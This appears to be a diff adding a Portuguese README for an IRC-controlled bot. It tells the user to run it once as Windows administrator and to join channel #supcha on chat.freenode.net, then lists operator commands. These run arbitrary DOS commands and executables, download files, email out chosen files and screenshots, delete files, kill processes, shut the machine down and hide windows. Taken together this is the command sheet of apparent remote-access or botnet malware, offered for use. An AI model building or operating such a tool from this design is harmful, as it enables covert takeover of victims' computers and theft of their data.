@@ -1,0 +1,39 @@
+﻿Executar no windows como administrador da primeira vez!
+
+conectar no chat.freenode.net, canal #supcha
+
+Comandos:
+!version | dá a versão
+!gc | chama o garbage collector
+!login p1 | loga o usuario
+!setwp imagem | seta imagem como wallpaper (deve ser feito o download antes)
+!join channel | entra em outro canal
+!cmd args | executa comando dos
+!die | sair do sistema
+!capscreen nome email | captura a tela ativa para nome.jpg envia para email
+!reboot | reboot
+!shutdown | shutdown
+!stopshutdown | stop shutdown
+!logoff | deslogar usuario
+!msg mensagem | mostra mensagem
+!run executavel | inicia executavel System.Diagnostics.Process.Start
+!flushdns | flushdns
+!readfile arquivo email | le o arquivo e manda por email
+!deletefile arquivo | apaga o arquivo
+!variables | lista as variaveis do sistema
+!sysinfo | mostra as carateristicas do sistema
+!download | baixa o arquivo de endereco na web para arquivolocal
+!fluship | release renew ip
+!siteblock site | bloqueia o site pelo lmhosts
+!siteunblock site | desbloqueia o site pelo lmhosts
+!rename ar1 arq2 | rename arq1 para arq2
+!processes | lista processos do sistema
+!processesall | lista todos processos do sistema
+!prockill processo | mata o processo no sistema
+!wsniff | GetForegroundWindow()
+!exists arq | checa se existe arq
+!showwin 0|1 janela | mostra ou esconde uma janela
+!ontime | mostra ticks hora
+!curpath | mostra caminho atual
+!batt | status da bateria
+
